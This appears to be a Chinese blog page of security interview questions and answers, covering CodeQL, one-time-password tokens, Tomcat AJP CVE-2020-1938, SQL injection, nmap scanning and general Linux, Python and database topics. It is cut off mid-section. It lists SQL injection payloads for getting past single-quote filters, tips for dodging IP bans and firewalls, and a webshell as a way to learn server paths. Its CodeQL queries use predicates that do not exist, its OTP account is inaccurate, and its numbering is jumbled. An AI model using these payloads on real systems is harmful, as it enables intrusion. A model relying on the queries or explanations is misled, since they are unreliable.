<li><strong>编译</strong>：编译是将源代码转换成机器码或字节码的过程。编译器在程序运行前完成这一工作，生成可执行文件。例如，C++代码通过编译器（如g++）编译成二进制文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ hello.cpp -o hello</span><br></pre></td></tr></table></figure></li>
<li><strong>非编译（解释执行）</strong>：解释执行是指源代码在运行时逐行翻译成机器码并执行，不需要事先编译。例如，Python脚本由Python解释器逐行执行：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python hello.py</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-CodeQL是否可以被修改为无需编译的工具"><a href="#4-CodeQL是否可以被修改为无需编译的工具" class="headerlink" title="4. CodeQL是否可以被修改为无需编译的工具"></a>4. CodeQL是否可以被修改为无需编译的工具</h3><p>CodeQL是一种静态代码分析工具，它通过分析编译后的代码（如Java字节码、C++的二进制文件）来检测代码中的安全漏洞。然而，CodeQL也可以直接分析源代码，无需编译。例如，对于Python、JavaScript等解释型语言，CodeQL可以直接分析源代码文件，无需编译。</p>
<h3 id="5-了解哪些类型的漏洞，如何用CodeQL检测"><a href="#5-了解哪些类型的漏洞，如何用CodeQL检测" class="headerlink" title="5. 了解哪些类型的漏洞，如何用CodeQL检测"></a>5. 了解哪些类型的漏洞，如何用CodeQL检测</h3><p><strong>常见漏洞类型</strong>：</p>
<ul>
<li><strong>SQL注入</strong>：攻击者通过在SQL查询中注入恶意代码来操纵数据库。</li>
<li><strong>跨站脚本（XSS）</strong>：攻击者在网页中注入恶意脚本，当其他用户访问该网页时，脚本被执行。</li>
<li><strong>缓冲区溢出</strong>：攻击者通过发送超出缓冲区大小的数据来覆盖内存，从而执行任意代码。</li>
<li><strong>命令注入</strong>：攻击者通过注入恶意命令来操纵系统命令。</li>
</ul>
<p><strong>使用CodeQL检测漏洞</strong>：</p>
<ul>
<li><strong>SQL注入</strong>：CodeQL可以通过分析代码中的SQL查询构造过程，检测是否存在用户输入直接拼接到SQL语句中的情况。例如，以下CodeQL查询可以检测Java中的SQL注入漏洞：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from String sql, MethodCall mc</span><br><span class="line">where</span><br><span class="line">  mc.getCallee().getName().matches(&quot;executeQuery|executeUpdate&quot;) and</span><br><span class="line">  mc.getArgument(0).getValue().toString().contains(sql) and</span><br><span class="line">  sql.hasTaintSource()</span><br><span class="line">select mc, &quot;Potential SQL injection vulnerability.&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>XSS</strong>：CodeQL可以分析Web应用程序中的用户输入处理过程，检测是否存在用户输入直接输出到HTML页面的情况。例如，以下CodeQL查询可以检测JavaScript中的XSS漏洞：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, StringLiteral s</span><br><span class="line">where</span><br><span class="line">  fc.getCallee().getName() = &quot;innerHTML&quot; and</span><br><span class="line">  fc.getArgument(1).getValue().toString().contains(s) and</span><br><span class="line">  s.hasTaintSource()</span><br><span class="line">select fc, &quot;Potential XSS vulnerability.&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>缓冲区溢出</strong>：CodeQL可以分析C&#x2F;C++代码中的内存操作函数（如<code>strcpy</code>、<code>sprintf</code>）的使用情况，检测是否存在缓冲区溢出的风险。例如，以下CodeQL查询可以检测C中的缓冲区溢出漏洞：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, Function f</span><br><span class="line">where</span><br><span class="line">  f.getName() = &quot;strcpy&quot; and</span><br><span class="line">  fc.getCallee() = f and</span><br><span class="line">  not fc.getArgument(1).hasDefinedSize()</span><br><span class="line">select fc, &quot;Potential buffer overflow vulnerability.&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>命令注入</strong>：CodeQL可以分析代码中的系统命令执行函数（如<code>system</code>、<code>exec</code>）的使用情况，检测是否存在用户输入直接拼接到命令中的情况。例如，以下CodeQL查询可以检测Python中的命令注入漏洞：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import python</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, StringLiteral s</span><br><span class="line">where</span><br><span class="line">  fc.getCallee().getName() = &quot;os.system&quot; and</span><br><span class="line">  fc.getArgument(0).getValue().toString().contains(s) and</span><br><span class="line">  s.hasTaintSource()</span><br><span class="line">select fc, &quot;Potential command injection vulnerability.&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。"><a href="#1-中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。" class="headerlink" title="1. 中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。"></a>1. 中行的电子口令卡，上面显示的字符每一分钟变换一次。问实现方法。</h3><p>中行的电子口令卡是一种动态口令卡，其显示的字符每分钟变换一次。这种动态口令卡的实现方法基于时间同步的加密算法。具体来说，动态口令卡内部存储了一个唯一的种子密钥，并且按照一定的时间间隔（如每分钟）生成一个动态口令。生成动态口令的过程通常使用HMAC-SHA1或HMAC-SHA256等加密算法，结合当前的时间戳和种子密钥进行计算。例如，假设当前时间戳为T，种子密钥为K，则动态口令的计算公式可以表示为：</p>
<p>[ \text{OTP} &#x3D; \text{HMAC-SHA1}(K, T) ]</p>
<p>生成的OTP（One-Time Password）是一个固定长度的字符串，通常经过Base32编码后显示在电子口令卡的屏幕上。服务器端也按照相同的算法和时间戳生成动态口令，并与用户提供的口令进行比对验证。</p>
<h3 id="3-对待一个问题怎么去思考？"><a href="#3-对待一个问题怎么去思考？" class="headerlink" title="3. 对待一个问题怎么去思考？"></a>3. 对待一个问题怎么去思考？</h3><p>面对一个问题，可以按照以下步骤进行思考：</p>
<ol>
<li><strong>问题分解</strong>：将复杂的问题分解为多个子问题，逐一分析。</li>
<li><strong>假设与检验</strong>：提出可能的解决方案或假设，并通过实验或逻辑推理进行验证。</li>
<li><strong>类比与联想</strong>：将当前问题与已知的类似问题进行比较，借鉴已有的解决思路。</li>
<li><strong>全局与局部思考</strong>：从整体上把握问题的背景和影响，同时深入分析问题的细节。</li>
<li><strong>换角度思考</strong>：从不同的角度审视问题，寻找新的解决途径。</li>
<li><strong>归纳与演绎</strong>：通过观察具体实例归纳出一般规律，再运用一般规律演绎出具体解决方案。</li>
</ol>
<h3 id="5-PKI的架构"><a href="#5-PKI的架构" class="headerlink" title="5. PKI的架构"></a>5. PKI的架构</h3><p>PKI（Public Key Infrastructure）是一种基于公钥加密技术的安全架构，用于管理数字证书和公钥。典型的PKI架构包括以下组件：</p>
<ul>
<li><strong>证书颁发机构（CA）</strong>：负责签发和管理数字证书。</li>
<li><strong>注册机构（RA）</strong>：负责用户身份的验证和注册。</li>
<li><strong>证书库（Certificate Repository）</strong>：存储已颁发的数字证书，供用户查询和验证。</li>
<li><strong>证书吊销列表（CRL）</strong>：记录已被吊销的证书列表，确保用户能够及时了解证书的有效性。</li>
</ul>
<h3 id="10-DMZ的作用以及位置"><a href="#10-DMZ的作用以及位置" class="headerlink" title="10. DMZ的作用以及位置"></a>10. DMZ的作用以及位置</h3><p>DMZ（Demilitarized Zone）是一种网络架构，用于将对外提供服务的服务器与内部网络隔离，以增强网络安全性。DMZ的主要作用包括：</p>
<ul>
<li><strong>隔离内部网络</strong>：将对外提供服务的服务器（如Web服务器、邮件服务器）放置在DMZ中，防止外部攻击直接访问内部网络。</li>
<li><strong>集中安全管理</strong>：在DMZ和内部网络之间部署防火墙，集中管理安全策略。<br>DMZ通常位于内部网络和外部网络（如Internet）之间，形成一个中间区域。在这个区域中，可以部署各种服务器，同时通过防火墙等设备对进出DMZ的流量进行严格控制。</li>
</ul>
<h3 id="最新爆出的Tomcat-AJP协议漏洞"><a href="#最新爆出的Tomcat-AJP协议漏洞" class="headerlink" title="最新爆出的Tomcat AJP协议漏洞"></a>最新爆出的Tomcat AJP协议漏洞</h3><p><strong>漏洞描述</strong>：<br>Tomcat AJP协议漏洞（CVE-2020-1938）是由于Tomcat在处理AJP请求时，未对请求做任何验证，通过设置AJP连接器封装的request对象的属性，导致产生了任意文件读取漏洞和代码执行漏洞。攻击者可以利用该漏洞读取Tomcat服务器上webapp目录下的任意文件，如果目标服务器同时存在文件上传功能，攻击者可进一步通过文件包含，上传恶意文件（如图片马），从而获取服务器的控制权。</p>
<p><strong>影响范围</strong>：</p>
<ul>
<li>Apache Tomcat 9.x &lt; 9.0.31</li>
<li>Apache Tomcat 8.x &lt; 8.5.51</li>
<li>Apache Tomcat 7.x &lt; 7.0.100</li>
<li>Apache Tomcat 6.x</li>
</ul>
<p><strong>漏洞原理</strong>：<br>Tomcat配置了两个Connector，分别是HTTP和AJP。HTTP默认端口为8080，处理HTTP请求，而AJP默认端口为8009，用于处理AJP协议的请求。AJP协议比HTTP更加优化，多用于反向代理和集群等场景。漏洞是由于Tomcat AJP协议存在缺陷，攻击者可以通过构造特定参数，读取服务器webapp下的任意文件，甚至包含任意文件。</p>
<p><strong>修复建议</strong>：</p>
<ol>
<li><strong>升级Tomcat版本</strong>：将Tomcat升级到9.0.31、8.5.51或7.0.100版本进行漏洞修复。</li>
<li><strong>禁用AJP协议端口</strong>：在conf&#x2F;server.xml配置文件中注释掉AJP Connector的配置行：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;--&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>配置AJP认证</strong>：为AJP Connector配置secretRequired和secret属性，设置AJP协议的认证凭证。例如：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8009&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;AJP/1.3&quot;</span> <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">address</span>=<span class="string">&quot;YOUR_TOMCAT_IP_ADDRESS&quot;</span> <span class="attr">requiredSecret</span>=<span class="string">&quot;YOUR_TOMCAT_AJP_SECRET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
其中，<code>YOUR_TOMCAT_IP_ADDRESS</code>和<code>YOUR_TOMCAT_AJP_SECRET</code>需要替换为实际的IP地址和高安全性密钥。</li>
</ol>
<h3 id="渗透测试过程中如果被ban-IP怎么办？"><a href="#渗透测试过程中如果被ban-IP怎么办？" class="headerlink" title="渗透测试过程中如果被ban IP怎么办？"></a>渗透测试过程中如果被ban IP怎么办？</h3><p>在渗透测试过程中，如果被ban IP，除了换代理IP外，还可以采取以下措施：</p>
<ol>
<li><strong>调整请求频率</strong>：降低请求频率，避免触发目标系统的防护机制。</li>
<li><strong>使用VPN或代理</strong>：使用不同的VPN或代理IP，避免使用单一IP进行大量请求。</li>
<li><strong>修改请求特征</strong>：修改请求头中的User-Agent、Referer等字段，模拟不同的浏览器和设备特征。</li>
<li><strong>分时请求</strong>：将请求分散在不同的时间段，避免短时间内大量请求。</li>
<li><strong>使用合法的测试环境</strong>：在合法的测试环境中进行渗透测试，避免在生产环境中进行可能导致IP被ban的操作。</li>
</ol>
<h3 id="SQL注入单引号被过滤了怎么绕过"><a href="#SQL注入单引号被过滤了怎么绕过" class="headerlink" title="SQL注入单引号被过滤了怎么绕过"></a>SQL注入单引号被过滤了怎么绕过</h3><p>当单引号被过滤时，可以通过以下方法绕过：</p>
<ol>
<li><strong>注释符绕过</strong>：使用注释符来闭合单引号。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; --+</span><br></pre></td></tr></table></figure>
这里的<code>--</code>是单行注释符，可以闭合前面的单引号。</li>
<li><strong>双引号绕过</strong>：如果允许使用双引号，可以用双引号代替单引号。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&quot;1&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>URL编码绕过</strong>：将单引号进行URL编码，例如将<code>&#39;</code>编码为<code>%27</code>。</li>
<li><strong>十六进制编码绕过</strong>：将字符串转换为十六进制表示。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0x3127</span><br></pre></td></tr></table></figure>
这表示<code>1&#39;</code>的十六进制编码。</li>
<li><strong>大小写混合绕过</strong>：利用MySQL对大小写不敏感的特点，混合使用大小写来绕过过滤。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; AnD 1=1</span><br></pre></td></tr></table></figure></li>
<li><strong>逻辑运算符绕过</strong>：使用<code>||</code>代替<code>OR</code>，使用<code>&amp;&amp;</code>代替<code>AND</code>。例如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; || 1=1</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="passwd与shadow文件的关系"><a href="#passwd与shadow文件的关系" class="headerlink" title="passwd与shadow文件的关系"></a>passwd与shadow文件的关系</h3><p>在Linux系统中，<code>/etc/passwd</code>和<code>/etc/shadow</code>文件共同管理用户账户信息：</p>
<ul>
<li>**<code>/etc/passwd</code>**：存储用户的基本信息，包括用户名、用户ID、组ID、用户描述、主目录和登录shell。其中，密码字段在现代系统中通常被标记为<code>x</code>，表示密码存储在<code>/etc/shadow</code>中。</li>
<li>**<code>/etc/shadow</code>**：存储用户的加密密码、密码过期时间、密码更改间隔等敏感信息。只有具有适当权限的用户（如root）才能访问此文件。</li>
</ul>
<p>两者的关系是：<code>/etc/passwd</code>中的密码字段指向<code>/etc/shadow</code>，后者实际存储密码信息。</p>
<h3 id="Linux怎样从文件选取包含特定字符的行，并替换相关字符"><a href="#Linux怎样从文件选取包含特定字符的行，并替换相关字符" class="headerlink" title="Linux怎样从文件选取包含特定字符的行，并替换相关字符"></a>Linux怎样从文件选取包含特定字符的行，并替换相关字符</h3><p>可以使用<code>grep</code>和<code>sed</code>命令来实现：</p>
<ol>
<li><p><strong>选取包含特定字符的行</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;特定字符&quot;</span> 文件名</span><br></pre></td></tr></table></figure>
<p>例如，选取包含字符<code>abc</code>的行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;abc&quot;</span> filename</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>替换相关字符</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&quot;s/旧字符/新字符/g&quot;</span> 文件名</span><br></pre></td></tr></table></figure>
<p>例如，将文件中所有的<code>abc</code>替换为<code>def</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&quot;s/abc/def/g&quot;</span> filename</span><br></pre></td></tr></table></figure>
<p>结合使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;abc&quot;</span> filename | sed <span class="string">&quot;s/abc/def/g&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="VRRP协议的原理及实现"><a href="#VRRP协议的原理及实现" class="headerlink" title="VRRP协议的原理及实现"></a>VRRP协议的原理及实现</h3><p><strong>原理</strong>：<br>VRRP（Virtual Router Redundancy Protocol）是一种用于提高网络可靠性的冗余协议。它通过创建一个虚拟路由器，将多台物理路由器组合成一个虚拟路由器组。在组内，一台路由器担任主路由器（Master），其他路由器作为备份路由器（Backup）。当主路由器发生故障时，备份路由器会接管虚拟路由器的角色，确保网络的连续性。<br><strong>实现</strong>：</p>
<ol>
<li><strong>配置虚拟路由器</strong>：在多台路由器上配置相同的虚拟路由器ID和虚拟IP地址。</li>
<li><strong>优先级设置</strong>：为主路由器设置较高的优先级，备份路由器设置较低的优先级。</li>
<li><strong>故障转移</strong>：当主路由器发生故障时，备份路由器通过选举机制成为新的主路由器。</li>
</ol>
<h3 id="SQL注入的那些防御措施是绝对安全的么？"><a href="#SQL注入的那些防御措施是绝对安全的么？" class="headerlink" title="SQL注入的那些防御措施是绝对安全的么？"></a>SQL注入的那些防御措施是绝对安全的么？</h3><p>没有防御措施是绝对安全的，但可以通过以下方法最大限度地减少SQL注入的风险：</p>
<ol>
<li><strong>使用参数化查询</strong>：通过参数化查询确保用户输入与SQL代码分离。</li>
<li><strong>输入验证</strong>：对用户输入进行严格的验证和过滤。</li>
<li><strong>最小权限原则</strong>：为数据库用户分配最小必要的权限。</li>
<li><strong>定期更新和修补</strong>：及时更新数据库和应用程序，修复已知漏洞。</li>
<li><strong>使用Web应用防火墙（WAF）</strong>：WAF可以检测和阻止常见的SQL注入攻击。</li>
</ol>
<h3 id="Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描"><a href="#Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描" class="headerlink" title="Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描"></a>Nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描</h3><p><strong>原理</strong>：<br>Nmap通过发送各种类型的网络数据包来探测目标主机和端口的状态。常见的扫描类型包括：</p>
<ul>
<li><strong>TCP SYN扫描</strong>：发送SYN数据包，适用于快速扫描开放端口。</li>
<li><strong>TCP Connect扫描</strong>：使用系统调用<code>connect</code>来探测端口。</li>
<li><strong>UDP扫描</strong>：发送UDP数据包，适用于发现UDP服务。</li>
<li><strong>版本检测扫描</strong>：探测服务的版本信息。</li>
<li><strong>操作系统检测扫描</strong>：通过分析响应数据包推测目标操作系统。</li>
</ul>
<p><strong>细节</strong>：</p>
<ul>
<li><strong>端口状态</strong>：端口可能处于<code>open</code>（开放）、<code>closed</code>（关闭）、<code>filtered</code>（被过滤）等状态。</li>
<li><strong>扫描速度</strong>：可以通过<code>-T</code>选项调整扫描速度。</li>
<li><strong>规避检测</strong>：使用<code>-f</code>选项进行分片扫描，或使用<code>--source-port</code>指定源端口。</li>
</ul>
<p><strong>针对情况</strong>：</p>
<ul>
<li><strong>快速扫描</strong>：使用<code>-sS</code>进行TCP SYN扫描。</li>
<li><strong>全面扫描</strong>：结合多种扫描类型，如<code>-sV</code>进行版本检测。</li>
<li><strong>规避防火墙</strong>：使用分片扫描或随机化扫描顺序。</li>
</ul>
<h3 id="如何对外使用nmap扫描，遇到-的情况又该怎么办"><a href="#如何对外使用nmap扫描，遇到-的情况又该怎么办" class="headerlink" title="如何对外使用nmap扫描，遇到***的情况又该怎么办"></a>如何对外使用nmap扫描，遇到***的情况又该怎么办</h3><p><strong>遇到</strong>*的情况**：</p>
<ul>
<li><strong>被ban IP</strong>：可以尝试使用代理IP、VPN或调整扫描频率来避免被ban。</li>
<li><strong>防火墙限制</strong>：使用Nmap的规避检测功能，如分片扫描或随机化扫描。</li>
</ul>
<h3 id="网络层的常见攻击方式，IP欺骗，第三方拦截"><a href="#网络层的常见攻击方式，IP欺骗，第三方拦截" class="headerlink" title="网络层的常见攻击方式，IP欺骗，第三方拦截"></a>网络层的常见攻击方式，IP欺骗，第三方拦截</h3><p><strong>网络层常见攻击方式</strong>：</p>
<ul>
<li><strong>IP欺骗</strong>：攻击者伪造IP地址，使数据包看起来来自可信源。防范措施包括使用IPsec进行数据包验证。</li>
<li><strong>第三方拦截</strong>：攻击者通过中间人攻击截取和篡改数据包。防范措施包括使用加密协议（如SSL&#x2F;TLS）和虚拟专用网络（VPN）。</li>
<li><strong>拒绝服务攻击（DoS&#x2F;DDoS）</strong>：通过大量流量使目标系统瘫痪。防范措施包括使用防火墙和流量清洗服务。</li>
</ul>
<h3 id="ASP与PHP网站的区别"><a href="#ASP与PHP网站的区别" class="headerlink" title="ASP与PHP网站的区别"></a>ASP与PHP网站的区别</h3><p><strong>ASP</strong>：</p>
<ul>
<li><strong>开发环境</strong>：通常与Microsoft的IIS服务器和.NET框架结合使用。</li>
<li><strong>语法</strong>：使用VBScript或JScript等脚本语言。</li>
<li><strong>数据库连接</strong>：常用ADO（ActiveX Data Objects）进行数据库操作。</li>
<li><strong>安全性</strong>：默认情况下可能提供更严格的安全性配置。</li>
</ul>
<p><strong>PHP</strong>：</p>
<ul>
<li><strong>开发环境</strong>：跨平台，可在Apache、Nginx等多种Web服务器上运行。</li>
<li><strong>语法</strong>：C风格的语法，与Perl、Java等语言相似。</li>
<li><strong>数据库连接</strong>：提供多种数据库扩展，如MySQLi、PDO等。</li>
<li><strong>安全性</strong>：需要开发者自行配置安全性措施。</li>
</ul>
<h3 id="什么叫DMA"><a href="#什么叫DMA" class="headerlink" title="什么叫DMA"></a>什么叫DMA</h3><p><strong>DMA（Direct Memory Access）</strong>是一种硬件机制，允许某些硬件子系统直接与系统内存进行数据交换，而无需CPU的干预。这可以提高数据传输的效率，减轻CPU的负担。</p>
<h3 id="获取网站绝对路径的四种方式"><a href="#获取网站绝对路径的四种方式" class="headerlink" title="获取网站绝对路径的四种方式"></a>获取网站绝对路径的四种方式</h3><ol start="2">
<li><strong>服务器错误信息</strong>：服务器返回的错误信息可能包含绝对路径。</li>
<li><strong>PHP函数</strong>：如<code>__FILE__</code>、<code>dirname(__FILE__)</code>等。</li>
<li><strong>Webshell</strong>：通过上传Webshell获取服务器信息。</li>
</ol>
<h3 id="如何防止SQL注入，具体的函数"><a href="#如何防止SQL注入，具体的函数" class="headerlink" title="如何防止SQL注入，具体的函数"></a>如何防止SQL注入，具体的函数</h3><p>在PHP中，可以使用<code>mysqli_real_escape_string()</code>函数对用户输入进行转义。此外，使用参数化查询也是防止SQL注入的有效方法。</p>
<h3 id="SQLmap中-T知道什么意思吗？"><a href="#SQLmap中-T知道什么意思吗？" class="headerlink" title="SQLmap中-T知道什么意思吗？"></a>SQLmap中-T知道什么意思吗？</h3><p>在SQLmap中，<code>-T</code>参数用于指定要测试的数据库表名。</p>
<h3 id="Python列表推导"><a href="#Python列表推导" class="headerlink" title="Python列表推导"></a>Python列表推导</h3><p>列表推导是一种简洁的创建列表的方法。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">squares = [x**<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="判断某个类是否有某种属性"><a href="#判断某个类是否有某种属性" class="headerlink" title="判断某个类是否有某种属性"></a>判断某个类是否有某种属性</h3><p>可以使用<code>hasattr()</code>函数。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.my_attribute = <span class="number">42</span></span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(obj, <span class="string">&#x27;my_attribute&#x27;</span>))  <span class="comment"># 输出: True</span></span><br></pre></td></tr></table></figure>

<h3 id="init-和-new"><a href="#init-和-new" class="headerlink" title="init 和 new"></a><strong>init</strong> 和 <strong>new</strong></h3><ul>
<li><code>__new__</code>：是类的构造方法，用于创建类的实例。</li>
<li><code>__init__</code>：是类的初始化方法，用于初始化类的实例。</li>
</ul>
<h3 id="装饰器应用场景"><a href="#装饰器应用场景" class="headerlink" title="装饰器应用场景"></a>装饰器应用场景</h3><p>装饰器用于在不修改函数本身的情况下，增加函数的功能。例如，日志记录、权限验证等。</p>
<h3 id="静态方法-staticmethod"><a href="#静态方法-staticmethod" class="headerlink" title="静态方法 staticmethod"></a>静态方法 staticmethod</h3><p>静态方法是属于类的方法，但不需要访问类的特定实例。可以使用<code>@staticmethod</code>装饰器定义。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">my_static_method</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This is a static method.&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="已知某端口，查看占用它的进程号"><a href="#已知某端口，查看占用它的进程号" class="headerlink" title="已知某端口，查看占用它的进程号"></a>已知某端口，查看占用它的进程号</h3><p>可以使用<code>netstat</code>命令。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep :80</span><br></pre></td></tr></table></figure>

<h3 id="已知某个-a-py-进程跑着，查看其端口"><a href="#已知某个-a-py-进程跑着，查看其端口" class="headerlink" title="已知某个 a.py 进程跑着，查看其端口"></a>已知某个 a.py 进程跑着，查看其端口</h3><p>可以使用<code>lsof</code>命令。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :80 | grep a.py</span><br></pre></td></tr></table></figure>

<h3 id="杀死机器所有-python-进程、"><a href="#杀死机器所有-python-进程、" class="headerlink" title="杀死机器所有 python 进程、"></a>杀死机器所有 python 进程、</h3><p>可以使用<code>pkill</code>命令。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -f python</span><br></pre></td></tr></table></figure>

<h3 id="MongoDB-和-MySQL"><a href="#MongoDB-和-MySQL" class="headerlink" title="MongoDB 和 MySQL"></a>MongoDB 和 MySQL</h3><p><strong>MongoDB</strong>：</p>
<ul>
<li><strong>数据模型</strong>：MongoDB 是一个文档型数据库，使用 BSON（Binary JSON）格式存储数据。数据以文档的形式组织，文档可以嵌套，支持复杂的数据结构。</li>
<li><strong>schema灵活性</strong>：MongoDB 的 schema 是动态的，可以在插入数据时定义字段，无需预先定义表结构。</li>
<li><strong>扩展性</strong>：MongoDB 支持水平扩展，通过分片（sharding）可以将数据分布在多个服务器上，适合处理大规模数据。</li>
</ul>
<p><strong>MySQL</strong>：</p>
<ul>
<li><strong>数据模型</strong>：MySQL 是一个关系型数据库，数据以表格的形式存储，表与表之间通过关系连接。</li>
<li><strong>schema定义</strong>：MySQL 的 schema 是静态的，需要预先定义表结构和字段类型。</li>
<li><strong>扩展性</strong>：MySQL 支持垂直扩展，通过增加服务器的硬件资源来提升性能，也支持主从复制等高可用方案。</li>
</ul>
<h3 id="INNER-JOIN-LEFT-JOIN-RIGHT-JOIN"><a href="#INNER-JOIN-LEFT-JOIN-RIGHT-JOIN" class="headerlink" title="INNER JOIN, LEFT JOIN, RIGHT JOIN"></a>INNER JOIN, LEFT JOIN, RIGHT JOIN</h3><ul>
<li><strong>INNER JOIN</strong>：返回两个表中匹配的行。语法：<code>SELECT columns FROM table1 INNER JOIN table2 ON table1.column = table2.column;</code></li>
<li><strong>LEFT JOIN</strong>：返回左表中的所有行，以及右表中匹配的行。如果右表中没有匹配的行，则返回 NULL。语法：<code>SELECT columns FROM table1 LEFT JOIN table2 ON table1.column = table2.column;</code></li>
<li><strong>RIGHT JOIN</strong>：返回右表中的所有行，以及左表中匹配的行。如果左表中没有匹配的行，则返回 NULL。语法：<code>SELECT columns FROM table1 RIGHT JOIN table2 ON table1.column = table2.column;</code></li>
</ul>
<h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询是指在一个查询语句内部嵌套另一个查询语句。例如：</p>
